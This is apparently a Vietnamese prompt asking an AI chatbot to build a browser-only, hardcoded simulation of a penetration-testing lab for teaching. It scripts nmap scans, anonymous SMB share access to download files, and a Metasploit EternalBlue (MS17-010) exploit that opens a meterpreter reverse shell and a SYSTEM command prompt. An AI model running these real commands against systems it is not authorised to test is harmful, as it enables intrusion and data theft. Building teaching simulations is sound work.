# PROMPT: Xây dựng Web Lab Mô phỏng Tấn công Mạng
> Dán toàn bộ nội dung file này vào Claude / ChatGPT để tạo lab

---

## 🎯 YÊU CẦU TỔNG QUAN

Hãy xây dựng cho tôi một **web app mô phỏng lab an ninh mạng** chạy hoàn toàn trên trình duyệt, không cần cài đặt bất kỳ phần mềm hay hệ điều hành nào. Giao diện giống terminal hacker thực tế.

---

## 🖥️ MÔ HÌNH LAB

```
Mạng nội bộ: 192.168.202.0/24

┌─────────────────┐     ┌─────────────────┐
│   Kali Linux    │────▶│   Windows 7     │
│ 192.168.202.132 │     │ 192.168.202.137 │
│  (Tấn công)     │     │  (Nạn nhân 1)   │
└─────────────────┘     └─────────────────┘
         │                      
         │              ┌─────────────────┐
         └─────────────▶│    Ubuntu       │
                        │ 192.168.202.136 │
                        │  (Nạn nhân 2)   │
                        └─────────────────┘
```

---

## 📋 CÁC KỊCH BẢN CẦN MÔ PHỎNG

### KỊCH BẢN 1: Quét mạng (Reconnaissance)

**Lệnh người dùng gõ:**
```
nmap -sn 192.168.202.0/24
```
**Output mô phỏng:**
```
Starting Nmap 7.99
Host: 192.168.202.132 (kali)       Status: Up
Host: 192.168.202.136 (ubuntu)     Status: Up
Host: 192.168.202.137 (win7)       Status: Up
Nmap done: 3 hosts up
```

---

**Lệnh người dùng gõ:**
```
nmap -sV -p 139,445 192.168.202.137
```
**Output mô phỏng:**
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Windows 7 SP1
445/tcp open  microsoft-ds Windows 7 SP1
MAC Address: 00:0C:29:48:D1:30 (VMware)
OS: Windows 7 Ultimate 7601 SP1 (32-bit)
```

---

**Lệnh người dùng gõ:**
```
nmap -sV -p 139,445 192.168.202.136
```
**Output mô phỏng:**
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 00:0C:29:D4:E1:C3 (VMware)
OS: Linux Ubuntu
```

---

### KỊCH BẢN 2: Phát hiện lỗ hổng (Vulnerability Scan)

**Lệnh người dùng gõ:**
```
nmap -p445 --script smb-vuln-ms17-010 192.168.202.137
```
**Output mô phỏng:**
```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1
|     State: VULNERABLE
|     IDs: CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
```

---

**Lệnh người dùng gõ:**
```
enum4linux -a 192.168.202.136
```
**Output mô phỏng:**
```
[+] Got domain/workgroup name: WORKGROUP
[+] Server 192.168.202.136 allows sessions using username='', password=''
[+] Share Enumeration:
    Sharename    Type    Comment
    ---------    ----    -------
    public       Disk    
    IPC$         IPC     IPC Service
[+] Attempting to map shares:
//192.168.202.136/public    Mapping: OK  Listing: OK  Writing: OK
```

---

### KỊCH BẢN 3: Khai thác Ubuntu — SMB Anonymous Access

**Lệnh người dùng gõ:**
```
smbclient -L 192.168.202.136 -N
```
**Output mô phỏng:**
```
Sharename    Type    Comment
---------    ----    -------
public       Disk    
IPC$         IPC     IPC Service (ubuntu server)
```

---

**Lệnh người dùng gõ:**
```
smbclient //192.168.202.136/public -N
```
**Output mô phỏng:**
```
Try "help" to get a list of possible commands.
smb: \>
```
*(Chuyển sang mini terminal SMB, chờ lệnh tiếp)*

**Lệnh tiếp theo:**
```
ls
```
**Output:**
```
  .                        D    0  Mon Nov 10 20:35:37 2026
  ..                       D    0  Mon Nov 10 20:35:37 2026
  secret.txt               N   27  Mon Nov 10 20:35:37 2026
  config.bak               N  512  Mon Nov 10 20:35:37 2026
  passwords.txt            N  128  Mon Nov 10 20:35:37 2026
20458536 blocks of size 1024. 11817784 blocks available
```

**Lệnh tiếp theo:**
```
get secret.txt
```
**Output:**
```
getting file \secret.txt of size 27 as secret.txt
✅ File downloaded successfully!
Content: "Day la file bi lo hong SMB"
```

---

### KỊCH BẢN 4: Khai thác Windows 7 — EternalBlue MS17-010

**Lệnh người dùng gõ:**
```
msfconsole
```
**Output mô phỏng:**
```
       =[ metasploit v6.3.44-dev                          ]
+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion  ]

msf6 >
```

---

**Lệnh tiếp theo:**
```
use exploit/windows/smb/ms17_010_psexec
```
**Output:**
```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) >
```

---

**Lệnh tiếp theo:**
```
set RHOSTS 192.168.202.137
set LHOST 192.168.202.132
set PAYLOAD windows/meterpreter/reverse_tcp
set SMBUser hacker
set SMBPass 1234
exploit
```
**Output:**
```
[*] Started reverse TCP handler on 192.168.202.132:4444
[*] 192.168.202.137:445 - Target OS: Windows 7 Ultimate 7601 SP1
[*] 192.168.202.137:445 - Built a write-what-where primitive...
[+] 192.168.202.137:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.202.137:445 - Selecting PowerShell target
[*] 192.168.202.137:445 - Executing the payload...
[*] Sending stage (199238 bytes) to 192.168.202.137
[*] Meterpreter session 1 opened (192.168.202.132:4444 -> 192.168.202.137:49169)

meterpreter >
```
*(Chuyển sang Meterpreter shell)*

---

**Lệnh tiếp theo:**
```
getuid
```
**Output:**
```
Server username: NT AUTHORITY\SYSTEM
```

**Lệnh tiếp theo:**
```
sysinfo
```
**Output:**
```
Computer        : WIN7-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x86
System Language : vi_VN
Logged On Users : 2
Meterpreter     : x86/windows
```

**Lệnh tiếp theo:**
```
shell
```
**Output:**
```
Process 648 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```
*(Chuyển sang Windows CMD shell)*

**Lệnh trong CMD:**
```
whoami
```
**Output:**
```
nt authority\system
```

```
net user
```
**Output:**
```
User accounts for \\WIN7-PC
Administrator   Guest   hacker
```

---

## 🎨 YÊU CẦU GIAO DIỆN

### Theme
- Nền đen hoàn toàn `#0a0a0a`
- Chữ xanh lá kiểu terminal `#00ff41`
- Highlight lệnh màu vàng `#ffff00`
- Error màu đỏ `#ff0000`
- Success màu xanh cyan `#00ffff`
- Font: `'Courier New', monospace`

### Layout
```
┌─────────────────────────────────────────────┐
│  🔴 LAB: Attack Simulation          [Info]  │
├──────────────┬──────────────────────────────┤
│              │                              │
│  KỊCH BẢN   │   TERMINAL OUTPUT            │
│  SIDEBAR     │                              │
│              │   kali@kali:~$ _             │
│  [KB1] Scan  │                              │
│  [KB2] Enum  │                              │
│  [KB3] SMB   │                              │
│  [KB4] MSF   │                              │
│              ├──────────────────────────────┤
│              │  > gõ lệnh ở đây...    [Run] │
└──────────────┴──────────────────────────────┘
```

### Tính năng bắt buộc
1. **Terminal giả lập** — gõ lệnh hoặc bấm nút chạy
2. **Sidebar kịch bản** — click vào kịch bản để load sẵn lệnh
3. **Nút "Chạy Demo"** — tự động chạy từng lệnh theo kịch bản có delay
4. **Hiệu ứng typing** — chữ xuất hiện từng ký tự như terminal thật
5. **Progress bar** — hiển thị tiến trình đang quét
6. **Màu sắc output** — xanh=success, đỏ=error, vàng=warning
7. **Nút Reset** — xóa terminal về trạng thái ban đầu
8. **Nút Copy** — copy toàn bộ output

---

## ⚙️ RULE VIẾT CODE

### Bắt buộc
```
✅ Một file HTML duy nhất (CSS + JS inline)
✅ Không dùng framework ngoài (React, Vue...)
✅ Không gọi API thật — toàn bộ output là hardcode/simulate
✅ Responsive — chạy được trên màn hình 1080p
✅ Không có console.error khi chạy
✅ Mỗi lệnh có output riêng được định nghĩa sẵn
✅ Hỗ trợ gõ tay lệnh + bấm nút
```

### Cấu trúc JS
```javascript
// Map lệnh → output
const COMMANDS = {
  "nmap -sn 192.168.202.0/24": `output...`,
  "msfconsole": `output...`,
  // ...
}

// Hàm xử lý lệnh
function handleCommand(cmd) {
  const output = COMMANDS[cmd.trim()] || "Command not found"
  printToTerminal(output)
}

// Hiệu ứng typing
function typeWriter(text, speed = 10) { ... }

// Chạy kịch bản tự động
async function runScenario(scenarioId) { ... }
```

### Các kịch bản (Scenario) định nghĩa sẵn
```javascript
const SCENARIOS = {
  scan: {
    name: "1. Quét mạng",
    commands: [
      "nmap -sn 192.168.202.0/24",
      "nmap -sV -p 139,445 192.168.202.137",
      "nmap -sV -p 139,445 192.168.202.136"
    ]
  },
  vuln: {
    name: "2. Phát hiện lỗ hổng",
    commands: [
      "nmap -p445 --script smb-vuln-ms17-010 192.168.202.137",
      "enum4linux -a 192.168.202.136"
    ]
  },
  smb_ubuntu: {
    name: "3. Khai thác Ubuntu",
    commands: [
      "smbclient -L 192.168.202.136 -N",
      "smbclient //192.168.202.136/public -N",
      "ls",
      "get secret.txt"
    ]
  },
  msf_win7: {
    name: "4. Khai thác Win7",
    commands: [
      "msfconsole",
      "use exploit/windows/smb/ms17_010_psexec",
      "set RHOSTS 192.168.202.137",
      "set LHOST 192.168.202.132",
      "exploit",
      "getuid",
      "sysinfo",
      "shell",
      "whoami"
    ]
  }
}
```

---

## 🚀 YÊU CẦU ĐẶC BIỆT

1. **Nút "Auto Demo"** — click 1 cái chạy toàn bộ 4 kịch bản liên tiếp
2. **Delay giữa các lệnh** — 1.5 giây để người xem theo dõi kịp
3. **Âm thanh typing** (optional) — tiếng gõ bàn phím khi chữ xuất hiện
4. **Thanh trạng thái** — hiển thị đang ở bước nào trong kịch bản
5. **Highlight IP** — tô màu các địa chỉ IP trong output
6. **Badge VULNERABLE** — hiện badge đỏ nháy khi phát hiện lỗ hổng

---

## 📝 GHI CHÚ

- Đây là môi trường **mô phỏng hoàn toàn** cho mục đích học tập
- Không có kết nối mạng thật nào được thực hiện
- Output là **hardcode** — không phải kết quả scan thật
- Dùng để **thuyết trình và giảng dạy** về an ninh mạng

---

> **Sau khi đọc xong, hãy build cho tôi file HTML hoàn chỉnh theo đúng spec trên.**
